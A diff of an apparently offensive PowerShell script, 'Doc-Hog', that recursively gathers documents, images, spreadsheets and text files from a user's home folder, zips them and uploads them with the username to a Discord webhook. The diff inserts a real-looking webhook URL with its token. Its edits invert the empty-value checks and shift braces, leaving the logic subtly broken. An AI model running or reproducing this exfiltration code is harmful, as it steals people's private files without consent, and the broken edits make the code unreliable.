@@ -1,27 +1,28 @@
 ﻿function Doc-Hog {
     [CmdletBinding()]
     param (
-        [parameter(Position=0,Mandatory=$False)]
+        [parameter(Position=0,Mandatory=$false)]
         [string]$file,
-        [parameter(Position=1,Mandatory=$False)]
+        [parameter(Position=1,Mandatory=$false)]
         [string]$text 
     )
 
-    $hookurl = 'DISCORD-WEBHOOK'
+    $hookurl = 'https://discordapp.com/api/webhooks/1259447476172099616/L-bGHhxLxSy11ws-eaQjQxL7BxYxEYByUHNNwxMhRHsScsxozGlX19cE-lk1gHzrfeRA'
 
     $Body = @{
-      'username' = $env:username
-      'content' = $text
+        username = $env:username
+        content = $text
     }
 
-    if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    if ([string]::IsNullOrEmpty($text)) {
+        # Send text to webhook
+        Invoke-RestMethod -ContentType "application/json" -Uri $hookurl  -Method Post -Body (ConvertTo-Json $Body)
     }
 
-    if (-not ([string]::IsNullOrEmpty($file))) {
-        curl.exe -F "file1=@$file" $hookurl
+    if ([string]::IsNullOrEmpty($file)) {
+        # Send file to webhook
+        curl.exe -F "File=@$(Resolve-Path $file)" $hookurl
     }
-}
 
 $Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse
 
@@ -48,4 +49,5 @@ foreach ($type in $types.Keys) {
 
         Doc-Hog -file $zipFile -text "Uploading $($types[$type]) files"
     }
+}
 }
